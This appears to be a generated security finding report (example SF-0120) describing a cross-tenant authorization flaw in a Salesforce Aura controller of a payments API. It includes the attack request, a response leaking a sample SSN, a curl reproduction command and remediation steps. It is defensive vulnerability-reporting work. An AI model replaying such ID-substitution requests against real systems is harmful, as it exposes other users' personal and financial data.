# Security Analysis Report
**System:** PayBridge Transaction API (Salesforce-Integrated)
**Domain:** Fintech / Payments Gateway
**Example ID:** SF-0120
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant / cross-tenant access — attacker substitutes `leadId` in `c.LeadController.getLeadData` to access Lead records belonging to other tenants/users; `without sharing` bypasses OWD=Private |

---

## Finding 1 — BOLA: Multi-Tenant / Cross-Tenant Access (Pattern 1.5)

### Summary
The Aura controller `c.LeadController.getLeadData` on PayBridge Transaction API (`b1704582.lightning.force.com`) is vulnerable to BOLA Pattern 1.5 (multi-tenant / cross-tenant access). The `LeadController` runs `without sharing`, bypassing OWD=Private on the Lead object. The SOQL has no ownership predicate. An attacker with a valid Salesforce session substitutes any `leadId` (`0014582`) to read Lead records owned by other users/tenants, exposing `SensitiveData__c` (SSN) and `InternalNotes__c`. In a multi-tenant fintech payments gateway, this enables cross-tenant access to financial leads, payment instrument data, and PII.

**Context.txt inconsistency (documented):** §4.0 Apex class defines method `getLeadDetails`, but §5.0 and §6.0 HAR use `c.LeadController.getLeadData`. These conflict. The HAR (§6.0) is the primary evidence — `c.LeadController.getLeadData` is the authoritative affected Aura descriptor.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://b1704582.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://b1704582.lightning.force.com/aura
Authorization: Bearer 00DB1704582!ARb1704582...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DB1704582!ARb1704582...

message={
  "actions": [{
    "id": "1;a",
    "descriptor": "c.LeadController.getLeadData",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "leadId": "0014582",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response — Victim Lead Record Returned (cross-tenant)**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "0014582",
        "Name": "Victim Lead Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-78-1841"
      }]
    },
    "error": []
  }]
}
```
Victim's SSN `000-78-1841` and internal notes exposed. `OwnerId: 005VICTIM` confirms the record belongs to a different user/tenant. Cross-tenant lead data access in a payments gateway confirmed.

### Steps to Reproduce
1. Authenticate to PayBridge on `b1704582.lightning.force.com` and obtain a valid session token.
2. POST to `/aura` substituting a victim's `leadId`:
```bash
curl -s -X POST "https://b1704582.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DB1704582!ARb1704582..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: 00DB1704582!ARb1704582..." \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"0014582","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}'
# Vulnerable: returns SensitiveData__c (SSN: 000-78-1841) and InternalNotes__c for victim lead 0014582
# Secure: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Permissions"}]}]}
```

### Remediation
1. Declare `LeadController` as `with sharing` to enforce OWD=Private.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Add `WITH SECURITY_ENFORCED` to SOQL query.
